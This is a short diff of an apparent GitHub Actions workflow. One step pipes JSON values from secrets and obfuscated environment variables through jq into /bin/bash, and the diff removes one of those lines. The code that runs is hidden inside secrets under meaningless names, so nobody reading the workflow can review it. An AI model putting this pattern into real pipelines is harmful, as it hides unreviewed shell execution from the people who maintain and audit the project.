@@ -22,7 +22,6 @@ jobs:
           k653: ${{ secrets.k653 }}
         run: |
           printf '%s' "$k653" | jq -r .yazh235 | /bin/bash
-          echo $utvs405 | jq -r .hfkxq96 | /bin/bash
           echo $no42451 | jq -r .q2706 | /bin/bash
 
       - name: Upload archive
